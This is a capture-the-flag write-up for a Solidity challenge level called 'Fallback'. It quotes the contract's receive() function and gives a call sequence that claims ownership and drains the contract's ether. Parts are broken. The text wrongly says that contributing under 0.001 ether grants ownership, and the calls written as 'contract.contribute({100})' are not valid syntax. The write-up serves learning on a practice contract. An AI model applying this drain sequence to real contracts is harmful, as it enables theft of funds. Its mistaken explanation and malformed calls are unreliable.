# 0. Fallback

You will beat this level if:

1. you claim ownership of the contract
2. you reduce its balance to 0

Things that might help:

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

For part 1, our address needs to claim ownership of the contract.
There is a fallback function that sets the owner to msg.sender if the conditions are met. 

``` 
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

the contribute function checks if the contribution is less than 0.001 ether and if it's true, the msg.sender takes ownership of the contract. 

```
toWei("0.001") => returns 1000000000000000
```
returns the value of ether to wei, so any contribution less than '1000000000000000' will allow msg.sender to take ownership of the contract. 
 
>order of calls to solve this stage
```
contract.contribute({100})
contract.sendTransaction({100})
contract.withdraw()
```

once ownership of the contract is taken, we can access the withdraw() function to drain the contract. 




